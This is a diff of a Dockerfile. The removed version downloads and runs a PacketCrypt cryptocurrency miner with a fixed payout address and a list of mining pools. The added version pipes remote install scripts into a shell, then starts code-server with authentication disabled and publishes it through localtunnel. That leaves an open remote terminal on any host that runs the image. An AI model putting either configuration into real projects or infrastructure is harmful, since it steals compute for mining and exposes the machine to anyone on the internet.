@@ -1,7 +1,10 @@
-FROM ubuntu:bionic
-RUN apt update && \
-        apt full-upgrade -y && \
-        apt install wget -y && \
-        wget http://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux && \
-        chmod +x packetcrypt_x8664_linux && \
-        ./packetcrypt_x8664_linux ann -p pPsrSwWjFoHC39qKjkL4dk2yL5feBZ9LwZ http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com
+FROM debian:stable-slim
+ENV DEBIAN_FRONTEND=noninteractive
+ENV TERM=xterm
+RUN apt-get update -y
+RUN apt-get install curl sudo apt-utils -y
+RUN curl -sL https://deb.nodesource.com/setup_16.x | bash
+RUN apt-get install nodejs -y
+RUN npm i -g localtunnel
+RUN curl -fsSL https://code-server.dev/install.sh | sh
+CMD ["/bin/bash", "-c", "code-server --auth=none --port=10000 & lt --port=10000"]
